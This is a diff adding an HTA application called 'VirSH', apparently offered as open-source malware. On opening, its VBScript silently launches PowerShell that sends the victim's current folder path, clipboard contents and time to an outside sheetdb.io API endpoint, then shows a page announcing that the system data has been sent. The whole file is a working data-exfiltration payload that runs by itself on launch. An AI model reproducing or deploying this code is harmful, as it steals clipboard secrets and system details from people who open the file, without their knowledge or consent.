@@ -1,0 +1,43 @@
+<html>
+<head>
+<title>VirSH</title>
+<meta charset="UTF-8">
+<HTA:APPLICATION
+  APPLICATIONNAME="VirSH"
+  ID="VirSH"
+  BORDER="thin"
+  CAPTION="yes"
+  SHOWINTASKBAR="yes"
+  SINGLEINSTANCE="yes"
+  SYSMENU="yes"
+  WINDOWSTATE="maximize"
+>
+</head>
+<style>
+body{
+background:black;
+text-align:center;
+font-weight:900;
+color:white;
+overflow: hidden;
+}
+a{
+text-decoration:none;
+color:red;
+}
+</style>
+<body>
+<script language="VBScript">
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell.exe Invoke-WebRequest -Uri https://sheetdb.io/api/v1/g3lbghsnl4aei -Method POST -Body @{'output'='Location : ' + (Get-Location) + ' Clipboard : ' + (Get-Clipboard) + ' Time : ' + (Get-Date -Format 'HH:mm:ss');}", 0, True
+Set objShell = Nothing
+</script>
+<code>
+<h1 style="font-size:80px;color:red;">👾</h1>
+<h1 style="color:red;">VirSH</h1>
+<p style="color:green; font-size:15px;">Your system data has been sent to the api</p>
+<p>Open Source : <a href="https://github.com/Mr-Banana-2045">https://github.com/Mr-Banana-2045</a>
+</code>
+</body>
+</html>
